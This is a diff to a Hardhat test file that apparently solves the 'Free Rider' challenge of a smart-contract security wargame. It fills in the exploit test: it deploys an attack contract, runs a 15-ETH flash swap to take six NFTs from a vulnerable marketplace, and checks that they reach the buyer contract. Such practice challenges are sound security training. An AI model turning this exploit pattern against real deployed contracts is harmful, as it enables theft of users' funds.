@@ -105,6 +105,37 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const FreeRiderAttackFactory = await ethers.getContractFactory('FreeRiderAttackV2');
+        this.badContract = await FreeRiderAttackFactory
+        .deploy(this.weth.address, 
+                this.uniswapFactory.address, 
+                this.marketplace.address, 
+                this.nft.address,
+                this.buyerContract.address
+
+                );
+
+        const amount = ethers.utils.parseEther('15');
+        const arr = [0,1,2,3,4,5];
+
+        var abiCoder = ethers.utils.defaultAbiCoder;
+        const data = abiCoder.encode([ "uint256[]", "uint256" ], [ arr, amount ]);
+
+
+        expect( await this.badContract
+            .connect(attacker)
+            .flashSwap(
+                this.uniswapPair.address, 
+                this.weth.address,
+                amount,
+                data) ).to.emit(this.badContract.address, 'Log');
+
+        for (let id = 0; id < AMOUNT_OF_NFTS; id++) {
+            expect(await this.nft.ownerOf(id)).to.be.eq(this.buyerContract.address);
+        }
+
+        expect(await ethers.provider.getBalance(this.buyerContract.address)).to.be.lt(BUYER_PAYOUT);
+        
     });
 
     after(async function () {
